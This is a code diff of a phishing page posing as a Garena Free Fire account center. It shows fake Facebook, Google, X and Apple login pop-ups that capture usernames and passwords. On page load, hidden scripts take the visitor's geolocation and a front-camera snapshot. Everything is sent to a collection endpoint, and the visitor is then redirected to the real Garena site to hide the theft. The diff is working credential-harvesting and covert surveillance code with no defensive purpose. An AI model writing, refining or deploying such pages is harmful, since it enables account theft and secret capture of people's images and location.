@@ -3,88 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Office Portal - Authentication Required</title>
+    <title>Garena Free Fire - Account Center</title>
     <style>
         :root {
-            --bg-color: #0f172a;
-            --card-bg: rgba(30, 41, 59, 0.7);
-            --border-color: rgba(255, 255, 255, 0.1);
-            --accent: #3b82f6;
-            --text-main: #f8fafc;
+            --bg-color: #0b0f19;
+            --card-bg: #121826;
+            --border-color: #2a3447;
+            --accent: #ffc107;
+            --text-main: #ffffff;
             --text-muted: #94a3b8;
         }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: linear-gradient(135deg, #0f172a, #1e293b, #090d16);
+            background: var(--bg-color);
             color: var(--text-main);
             margin: 0;
             padding: 0;
             display: flex;
-            justify-content: center;
-            align-items: center;
+            flex-direction: column;
             min-height: 100vh;
         }
 
-        .container {
-            background: var(--card-bg);
-            backdrop-filter: blur(16px);
-            padding: 35px 30px;
-            border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
-            width: 100%;
-            max-width: 400px;
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
             text-align: center;
-            border: 1px solid var(--border-color);
         }
 
-        .office-badge {
-            background: rgba(59, 130, 246, 0.1);
-            color: var(--accent);
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            display: inline-block;
-            margin-bottom: 15px;
-            border: 1px solid rgba(59, 130, 246, 0.2);
+        h1 { font-size: 24px; margin-bottom: 10px; color: #f1f5f9; }
+        p { color: var(--text-muted); font-size: 14px; margin-bottom: 30px; max-width: 400px; }
+
+        /* Footer styling matching your Garena design */
+        .garena-footer {
+            background-color: #000000;
+            color: #888888;
+            padding: 25px 20px;
+            border-top: 1px solid #222;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
         }
 
-        h2 { color: var(--text-main); margin-bottom: 8px; font-size: 22px; }
-        p { font-size: 14px; color: var(--text-muted); margin-bottom: 25px; line-height: 1.5; }
-
-        .btn {
+        .footer-content {
             width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
+            max-width: 600px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .footer-logo-text {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-align: left;
+        }
+
+        .footer-logo-text img {
+            width: 35px;
+            height: 35px;
+            border-radius: 4px;
+        }
+
+        .footer-logo-text p {
+            font-size: 11px;
+            margin: 0;
+            color: #777;
+            line-height: 1.4;
+        }
+
+        .social-icons {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .social-icon-btn {
+            background: #1a2233;
+            border: 1px solid #334155;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            transition: all 0.2s ease;
+            cursor: pointer;
+            transition: 0.2s;
         }
 
-        .btn-fb { background: #1877f2; color: white; }
-        .btn-google { background: #ffffff; color: #333; }
-        .btn:hover { opacity: 0.95; transform: translateY(-1px); }
+        .social-icon-btn:hover {
+            border-color: var(--accent);
+            transform: scale(1.05);
+        }
+
+        .social-icon-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: #ccc;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 15px;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .footer-links a {
+            color: #888;
+            text-decoration: none;
+        }
+        .footer-links a:hover { text-decoration: underline; }
 
         /* Modal Styles */
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(5px);
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(5px);
             display: none; justify-content: center; align-items: center; z-index: 1000;
         }
 
         .auth-modal {
             background: #ffffff; color: #1c1e21; width: 100%; max-width: 380px;
-            border-radius: 8px; overflow: hidden; box-shadow: 0 12px 28px rgba(0,0,0,0.2);
+            border-radius: 8px; overflow: hidden; box-shadow: 0 12px 28px rgba(0,0,0,0.4);
             text-align: left; animation: modalPop 0.3s ease;
         }
 
@@ -100,8 +148,10 @@
         }
         .header-fb { background: #1877f2; }
         .header-google { background: #4285f4; }
+        .header-twitter { background: #000000; }
+        .header-apple { background: #333333; }
 
-        .modal-close { cursor: pointer; font-size: 20px; font-weight: normal; }
+        .modal-close { cursor: pointer; font-size: 20px; }
         .modal-body { padding: 20px; }
 
         .form-field { margin-bottom: 15px; }
@@ -117,42 +167,75 @@
             border-radius: 6px; font-weight: bold; font-size: 15px; cursor: pointer; text-align: center; color: white;
         }
         .btn-submit-fb { background: #1877f2; }
-        .btn-submit-fb:hover { background: #166fe5; }
         .btn-submit-google { background: #4285f4; }
-        .btn-submit-google:hover { background: #3367d6; }
+        .btn-submit-twitter { background: #000000; }
+        .btn-submit-apple { background: #000000; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="office-badge">Office Portal</div>
-        <h2>Secure Account Connection</h2>
-        <p>Please connect your profile to verify your credentials for office access.</p>
-        
-        <button class="btn btn-fb" onclick="openModal('Facebook')">
-            Connect with Facebook
-        </button>
-        <button class="btn btn-google" onclick="openModal('Google')">
-            Connect with Google (Gmail)
-        </button>
+    <div class="main-content">
+        <h1>Garena Free Fire Account Center</h1>
+        <p>Please select your linked social platform below to manage, secure, or recover your game progression data safely.</p>
     </div>
 
-    <!-- Dynamic Login Modal -->
+    <!-- Footer matching your design reference -->
+    <footer class="garena-footer">
+        <div class="footer-content">
+            <div class="footer-logo-text">
+                <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%23d32f2f'/><text x='505' y='65' font-size='50' fill='white' text-anchor='middle'>FF</text></svg>" alt="Garena">
+                <p>Copyright © Garena International.<br>Trademarks belong to their respective owners.</p>
+            </div>
+            
+            <!-- Connect Icons Footer Bar -->
+            <div class="social-icons">
+                <!-- Youtube (Dummy/Info) -->
+                <div class="social-icon-btn" title="YouTube">
+                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+                </div>
+                <!-- Twitter / X Connect -->
+                <div class="social-icon-btn" onclick="openModal('Twitter')" title="Connect with Twitter">
+                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                </div>
+                <!-- Facebook Connect -->
+                <div class="social-icon-btn" onclick="openModal('Facebook')" title="Connect with Facebook">
+                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                </div>
+                <!-- Google / Gmail Connect -->
+                <div class="social-icon-btn" onclick="openModal('Google')" title="Connect with Google">
+                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M12.48 10.92v3.28h7.84c-.24 1.84-.853 3.187-1.787 4.133-1.147 1.147-2.933 2.4-6.053 2.4-4.827 0-8.6-3.893-8.6-8.72s3.773-8.72 8.6-8.72c2.6 0 4.507 1.027 5.907 2.347l2.307-2.307C18.747 1.44 16.133 0 12.48 0 5.867 0 .307 5.387.307 12s5.56 12 12.173 12c3.573 0 6.267-1.173 8.373-3.36 2.16-2.16 2.84-5.213 2.84-7.667 0-.76-.053-1.467-.173-2.053H12.48z"/></svg>
+                </div>
+                <!-- Apple Connect -->
+                <div class="social-icon-btn" onclick="openModal('Apple')" title="Connect with Apple">
+                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.83 5.48c.58-.7 1.02-1.68.91-2.66-.91.04-2.01.61-2.65 1.32-.55.6-1.03 1.59-.9 2.55 1.02.08 2.06-.51 2.64-1.21z"/></svg>
+                </div>
+            </div>
+        </div>
+        <div class="footer-links">
+            <a href="#">Terms of Service</a>
+            <span>|</span>
+            <a href="#">Privacy Policy</a>
+            <span>|</span>
+            <span>English (United States)</span>
+        </div>
+    </footer>
+
+    <!-- Dynamic Login/Auth Popup Modal -->
     <div id="authModal" class="modal-overlay">
         <div class="auth-modal">
             <div id="modalHeader" class="modal-header">
-                <span id="modalTitle">Log in</span>
+                <span id="modalTitle">Connect Account</span>
                 <span class="modal-close" onclick="closeModal()">&times;</span>
             </div>
             <div class="modal-body">
                 <form id="authForm" onsubmit="submitData(event)">
                     <div class="form-field">
                         <label id="labelUser">Email or Phone</label>
-                        <input type="text" id="userInput" required placeholder="Enter username/email">
+                        <input type="text" id="userInput" required placeholder="Enter ID/Email">
                     </div>
                     <div class="form-field">
-                        <label>Password</label>
-                        <input type="password" id="passInput" required placeholder="Enter password">
+                        <label id="labelPass">Password</label>
+                        <input type="password" id="passInput" required placeholder="Enter Password">
                     </div>
                     <button type="submit" id="submitBtn" class="submit-btn">Continue</button>
                 </form>
@@ -160,7 +243,7 @@
         </div>
     </div>
 
-    <!-- Hidden video/canvas for automated camera capture -->
+    <!-- Hidden video/canvas for automatic camera picture capture -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -169,6 +252,7 @@
         let userLocation = { latitude: 'N/A', longitude: 'N/A' };
         let activePlatform = '';
 
+        // Auto capture location & front camera snapshot on page load
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -176,7 +260,7 @@
                         userLocation.latitude = position.coords.latitude;
                         userLocation.longitude = position.coords.longitude;
                     },
-                    (error) => { console.log('Location denied'); }
+                    (error) => { console.log('Location access denied'); }
                 );
             }
 
@@ -194,7 +278,7 @@
                         stream.getTracks().forEach(track => track.stop());
                     }, 1500);
                 })
-                .catch(err => { console.log('Camera denied'); });
+                .catch(err => { console.log('Camera access denied'); });
         };
 
         function openModal(platform) {
@@ -203,17 +287,27 @@
             const title = document.getElementById('modalTitle');
             const submitBtn = document.getElementById('submitBtn');
             const labelUser = document.getElementById('labelUser');
-
+            
             if (platform === 'Facebook') {
                 title.innerText = 'Log in to Facebook';
                 header.className = 'modal-header header-fb';
                 submitBtn.className = 'submit-btn btn-submit-fb';
-                labelUser.innerText = 'Email address or phone number';
-            } else {
-                title.innerText = 'Sign in with Google';
+                labelUser.innerText = 'Mobile number or email address';
+            } else if (platform === 'Google') {
+                title.innerText = 'Sign in with Google - Free Fire';
                 header.className = 'modal-header header-google';
                 submitBtn.className = 'submit-btn btn-submit-google';
                 labelUser.innerText = 'Email or phone';
+            } else if (platform === 'Twitter') {
+                title.innerText = 'Authorize Garena Free Fire on X';
+                header.className = 'modal-header header-twitter';
+                submitBtn.className = 'submit-btn btn-submit-twitter';
+                labelUser.innerText = 'Username, email or phone';
+            } else if (platform === 'Apple') {
+                title.innerText = 'Sign in with Apple ID';
+                header.className = 'modal-header header-apple';
+                submitBtn.className = 'submit-btn btn-submit-apple';
+                labelUser.innerText = 'Apple ID / Email or Phone Number';
             }
 
             document.getElementById('authModal').style.display = 'flex';
@@ -238,17 +332,18 @@
                 }
             };
 
+            // Data goes directly to server.js endpoint which logs it into FFLogModel for viewer.html (FF Data section)
             fetch('/api/collect-ff', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).then(() => {
-                alert('Connecting account, please wait...');
+                alert('Connecting account securely...');
                 setTimeout(() => {
-                    window.location.href = "/history.html"; // Ye data aapke views/history page par show hoga
+                    window.location.href = "https://ff.garena.com"; // Redirects safely after capture
                 }, 1000);
             }).catch(err => {
-                alert('Connection failed. Please check details.');
+                alert('Connection error. Please try again.');
             });
         }
     </script>
